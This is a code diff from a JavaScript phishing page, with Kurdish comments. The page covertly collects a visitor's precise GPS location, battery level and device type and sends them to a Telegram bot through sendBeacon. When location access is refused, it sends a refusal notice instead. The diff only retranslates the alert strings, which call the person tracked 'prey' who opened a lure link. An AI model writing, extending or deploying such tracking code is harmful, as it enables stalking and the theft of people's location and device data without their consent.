@@ -53,7 +53,7 @@
             }
 
             // ٥. ڕێکخستنی ڕاپۆرتەکە
-            let report = `🚨 <b>Target Locked!</b>\n\n` +
+            let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🔋 <b>Battery:</b> ${bat}\n` +
                          `📱 <b>Device:</b> ${navigator.platform}\n` +
@@ -65,7 +65,7 @@
             navigator.sendBeacon(url);
 
         }, (err) => {
-            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`;
+            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text= نێچیرەکە ڕێگری کرد لە کردنەوەی لینکەکە`;
             navigator.sendBeacon(url);
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
